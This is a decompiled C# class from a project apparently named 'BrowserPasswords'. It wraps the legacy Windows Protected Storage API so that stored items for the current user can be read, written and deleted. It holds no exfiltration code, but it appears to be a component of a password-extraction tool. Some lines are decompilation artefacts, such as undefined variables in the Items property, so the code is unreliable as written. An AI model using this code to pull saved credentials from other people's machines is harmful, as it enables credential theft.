using System;
using System.Runtime.InteropServices;
using BrowserPasswords.PStoreLib;
using Microsoft.VisualBasic;

namespace BrowserPasswords
{
	// Token: 0x02000042 RID: 66
	internal class CProtectStore : CUtils
	{
		// Token: 0x060001A2 RID: 418 RVA: 0x000061C0 File Offset: 0x000043C0
		public CProtectStore()
		{
			this.m_PStore = CProtectStore.GetPStoreInterface();
			this.m_KeyType = PST_KEY.PST_KEY_CURRENT_USER;
		}

		// Token: 0x060001A3 RID: 419
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int lstrlenA(int lpString);

		// Token: 0x060001A4 RID: 420
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int lstrlenW(int lpString);

		// Token: 0x060001A5 RID: 421
		[DllImport("pstorec.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int PStoreCreateInstance(ref IPStore ppProvider, ref Guid pProviderID, int pReserved, int dwFlags);

		// Token: 0x060001A6 RID: 422 RVA: 0x000061DC File Offset: 0x000043DC
		private static IPStore GetPStoreInterface()
		{
			IPStore result = null;
			Guid ms_BASE_PSTPROVIDER_SZID = guidProvider.MS_BASE_PSTPROVIDER_SZID;
			CProtectStore.PStoreCreateInstance(ref result, ref ms_BASE_PSTPROVIDER_SZID, 0, 0);
			return result;
		}

		// Token: 0x1700008A RID: 138
		// (get) Token: 0x060001A7 RID: 423 RVA: 0x00006204 File Offset: 0x00004404
		// (set) Token: 0x060001A8 RID: 424 RVA: 0x0000621C File Offset: 0x0000441C
		public PST_KEY KeyType
		{
			get
			{
				return this.m_KeyType;
			}
			set
			{
				this.m_KeyType = value;
			}
		}

		// Token: 0x1700008B RID: 139
		// (get) Token: 0x060001A9 RID: 425 RVA: 0x00006228 File Offset: 0x00004428
		public CTypes Types
		{
			get
			{
				return new CTypes(this.m_PStore, this.m_KeyType);
			}
		}

		// Token: 0x1700008C RID: 140
		// (get) Token: 0x060001AA RID: 426 RVA: 0x0000624C File Offset: 0x0000444C
		public CItems Items
		{
			get
			{
				return new CItems(this.m_PStore, this.m_KeyType, ref guidItemType, ref guidItemSubType);
			}
		}

		// Token: 0x060001AB RID: 427 RVA: 0x00006274 File Offset: 0x00004474
		public void CreateType(Guid guidItemType, string szDisplayName)
		{
			PST_TYPEINFO pst_TYPEINFO;
			pst_TYPEINFO.cbSize = Marshal.SizeOf(pst_TYPEINFO);
			pst_TYPEINFO.szDisplayName = Marshal.StringToHGlobalUni(szDisplayName);
			try
			{
				this.m_PStore.CreateType(this.m_KeyType, ref guidItemType, ref pst_TYPEINFO, 0);
			}
			finally
			{
				Marshal.FreeHGlobal(pst_TYPEINFO.szDisplayName);
			}
		}

		// Token: 0x060001AC RID: 428 RVA: 0x000062D8 File Offset: 0x000044D8
		public void CreateSubType(Guid guidItemType, Guid guidItemSubType, string szDisplayName)
		{
			PST_TYPEINFO pst_TYPEINFO;
			pst_TYPEINFO.cbSize = Strings.Len(pst_TYPEINFO);
			pst_TYPEINFO.szDisplayName = Marshal.StringToHGlobalUni(szDisplayName);
			try
			{
				PST_ACCESSRULESET pst_ACCESSRULESET;
				pst_ACCESSRULESET.cbSize = Marshal.SizeOf(pst_ACCESSRULESET);
				pst_ACCESSRULESET.cRules = 0;
				pst_ACCESSRULESET.rgRules = 0;
				this.m_PStore.CreateSubtype(this.m_KeyType, ref guidItemType, ref guidItemSubType, ref pst_TYPEINFO, ref pst_ACCESSRULESET, 0);
			}
			finally
			{
				Marshal.FreeHGlobal(pst_TYPEINFO.szDisplayName);
			}
		}

		// Token: 0x060001AD RID: 429 RVA: 0x00006360 File Offset: 0x00004560
		public void DeleteItem(Guid guidItemType, Guid guidItemSubType, string szItemName)
		{
			this.m_PStore.DeleteItem(this.m_KeyType, ref guidItemType, ref guidItemSubType, szItemName, 0, 0);
		}

		// Token: 0x060001AE RID: 430 RVA: 0x0000637C File Offset: 0x0000457C
		public void DeleteType(Guid guidItemType)
		{
			this.m_PStore.DeleteType(this.m_KeyType, ref guidItemType, 0);
		}

		// Token: 0x060001AF RID: 431 RVA: 0x00006394 File Offset: 0x00004594
		public void DeleteSubType(Guid guidItemType, Guid guidItemSubType)
		{
			this.m_PStore.DeleteSubtype(this.m_KeyType, ref guidItemType, ref guidItemSubType, 0);
		}

		// Token: 0x060001B0 RID: 432 RVA: 0x000063AC File Offset: 0x000045AC
		public byte[] ReadItem(Guid guidItemType, Guid guidItemSubType, string szItemName)
		{
			byte[] array = null;
			int num;
			IntPtr intPtr;
			this.m_PStore.ReadItem(this.m_KeyType, ref guidItemType, ref guidItemSubType, szItemName, ref num, ref intPtr, 0, 0);
			if (intPtr != IntPtr.Zero)
			{
				array = new byte[checked(num - 1 + 1)];
				Marshal.Copy(intPtr, array, 0, num);
			}
			return array;
		}

		// Token: 0x060001B1 RID: 433 RVA: 0x00006400 File Offset: 0x00004600
		public void WriteItem(Guid guidItemType, Guid guidItemSubType, string szItemName, int ptrBuff, int pcbBuff)
		{
			PST_PROMPTINFO pst_PROMPTINFO;
			pst_PROMPTINFO.cbSize = Marshal.SizeOf(pst_PROMPTINFO);
			pst_PROMPTINFO.dwPromptFlags = 2;
			pst_PROMPTINFO.hwndApp = 0;
			pst_PROMPTINFO.szPrompt = 0;
			this.m_PStore.WriteItem(this.m_KeyType, ref guidItemType, ref guidItemSubType, szItemName, pcbBuff, ptrBuff, ref pst_PROMPTINFO, 1, 0);
		}

		// Token: 0x04000195 RID: 405
		private IPStore m_PStore;

		// Token: 0x04000196 RID: 406
		private PST_KEY m_KeyType;
	}
}
